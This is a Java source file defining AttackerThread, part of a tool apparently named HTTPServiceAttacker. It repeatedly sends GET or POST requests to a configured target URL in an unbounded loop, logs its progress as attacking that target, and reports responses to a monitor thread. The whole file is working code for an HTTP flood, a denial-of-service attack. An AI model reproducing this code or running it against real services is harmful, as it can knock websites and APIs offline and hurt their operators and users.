package com.ishland.app.HTTPServiceAttacker.attacker.threads;

import java.io.IOException;
import java.io.UnsupportedEncodingException;

import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class AttackerThread extends Thread {

    public static final byte GET = 0x00;
    public static final byte POST = 0x01;

    private static int num = 0;

    private Logger logger = null;

    private boolean isStopping = false;
    private String target = null;
    private byte method = GET;
    private String data = null;
    private boolean showExceptions = true;

    public AttackerThread() {
	super();
	num++;
	logger = LogManager.getLogger("Attacker Thread - " + String.valueOf(num));
	this.setName("Attacker Thread - " + String.valueOf(num));
    }

    public void run() {
	logger.info("Starting " + this.getName() + "...");
	boolean isReady = true;
	boolean isError = false;
	if (target == null) {
	    logger.fatal("Target must not be null");
	    MonitorThread.newError();
	    isReady = false;
	}
	if (method == POST && data == null) {
	    logger.fatal("You must set the data in POST mode");
	    MonitorThread.newError();
	    isReady = false;
	}
	logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ") + target);
	RequestConfig defaultRequestConfig = RequestConfig.custom().setConnectTimeout(4000).setSocketTimeout(4000)
		.setConnectionRequestTimeout(8000).build();
	CloseableHttpClient httpClient = HttpClients.custom().setDefaultRequestConfig(defaultRequestConfig).build();
	logger.info(this.getName() + " started.");
	while (!isStopping && isReady) {
	    CloseableHttpResponse httpResponse = null;
	    if (this.method == GET) {
		HttpGet httpGetReq = null;
		try {
		    httpGetReq = new HttpGet(target);
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.fatal("Invaild target url", e);
		    else
			logger.fatal("Invaild target url");
		    MonitorThread.newError();
		    isError = true;
		    break;
		}
		try {
		    httpResponse = httpClient.execute(httpGetReq);
		} catch (ClientProtocolException e) {
		    if (showExceptions)
			logger.fatal("Invaild http verson, aborting current request...", e);
		    else
			logger.fatal("Invaild http verson, aborting current request...");
		    MonitorThread.newError();
		    continue;
		} catch (IOException e) {
		    if (showExceptions)
			logger.warn("I/O Error, aborting current request...", e);
		    else
			logger.warn("I/O Error, aborting current request...");
		    MonitorThread.newError();
		    continue;
		}
	    } else if (this.method == POST) {
		HttpPost httpPostReq = null;
		try {
		    httpPostReq = new HttpPost(target);
		    httpPostReq.setEntity(new StringEntity(data));
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.fatal("Invaild target url", e);
		    else
			logger.fatal("Invaild target url");
		    MonitorThread.newError();
		    isError = true;
		    break;
		} catch (UnsupportedEncodingException e) {
		    if (showExceptions)
			logger.fatal("Unsupported Encoding", e);
		    else
			logger.fatal("Unsupported Encoding");
		    MonitorThread.newError();
		    isError = true;
		    break;
		}
		try {
		    httpResponse = httpClient.execute(httpPostReq);
		} catch (ClientProtocolException e) {
		    if (showExceptions)
			logger.fatal("Invaild http verson, aborting current request...", e);
		    else
			logger.fatal("Invaild http verson, aborting current request...");
		    MonitorThread.newError();
		    continue;
		} catch (IOException e) {
		    if (showExceptions)
			logger.warn("I/O Error, aborting current request...", e);
		    else
			logger.warn("I/O Error, aborting current request...");
		    MonitorThread.newError();
		    continue;
		}
	    }
	    try {
		MonitorThread.pushResult(httpResponse);
	    } catch (NullPointerException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    } catch (IllegalArgumentException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    } catch (InterruptedException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    }
	}
	if (!isReady) {
	    logger.fatal("Exiting due to configuration error");
	    return;
	} else if (isError) {
	    logger.fatal("Exiting due to an error occured");
	    return;
	} else {
	    logger.info("Exiting due to termination");
	    return;
	}
    }

    /**
     * @return the isStopping
     */
    public boolean isStopping() {
	return isStopping;
    }

    /**
     * @param isStopping the isStopping to set
     */
    public void stopTask() {
	this.isStopping = true;
    }

    /**
     * @return the target
     */
    public String getTarget() {
	return target;
    }

    /**
     * @param target the target to set
     */
    public void setTarget(String target) {
	this.target = target;
    }

    /**
     * @return the method
     */
    public byte getMethod() {
	return method;
    }

    /**
     * @param method the method to set
     */
    public void setMethod(byte method) {
	this.method = method;
    }

    /**
     * @return the data
     */
    public String getData() {
	return data;
    }

    /**
     * @param method the method to set
     */
    public void setData(String data) {
	this.data = data;
    }

    /**
     * @param method the method to set
     */
    public void setShowExceptions(boolean showExceptions) {
	this.showExceptions = showExceptions;
    }

}
